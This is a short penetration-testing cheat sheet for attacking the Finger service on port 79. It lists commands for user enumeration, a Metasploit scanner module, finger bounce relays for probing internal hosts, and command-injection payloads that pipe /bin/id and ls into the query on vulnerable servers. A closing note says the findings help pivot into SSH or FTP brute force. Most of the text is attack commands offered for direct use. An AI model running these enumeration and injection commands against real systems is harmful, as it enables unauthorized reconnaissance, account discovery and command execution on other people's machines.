## CHECKS

```md
# Check if Finger service is enabled
# Enumerate valid users
# Attempt user information disclosure
# Test for command injection (older / misconfigured servers)
```
## BASIC LOGIN / ENUMERATION

```bash
# List Users
finger @$ip

# Get Specific User Info
finger user@$ip
```

Examples:

```bash
finger @victim        # List users
finger admin@victim   # Get admin info
finger user@victim    # Get user info
```
## COMMAND EXECUTION (Misconfigured Servers)

```bash
# Attempt Command Injection
finger "|/bin/id@$ip"
finger "|/bin/ls -la /@$ip"
```

⚠️ Works only on vulnerable / legacy implementations.
## USER ENUMERATION

```bash
# Enumerate Users from Wordlist
finger-user-enum.pl -U users.txt -t $ip

# Single User Check
finger-user-enum.pl -u root -t $ip

# Multiple Targets
finger-user-enum.pl -U users.txt -T ips.txt
```
## METASPLOIT

```bash
use auxiliary/scanner/finger/finger_users
```
## FINGER BOUNCE ATTACK

```bash
finger user@host@victim
finger @internal@external
```

Used for:

* Internal host enumeration
* Information disclosure through relay
## NOTES

```md
- Default port: 79
- Often disabled on modern systems
- Useful for username discovery
- Can help pivot into SSH / FTP brute force
```
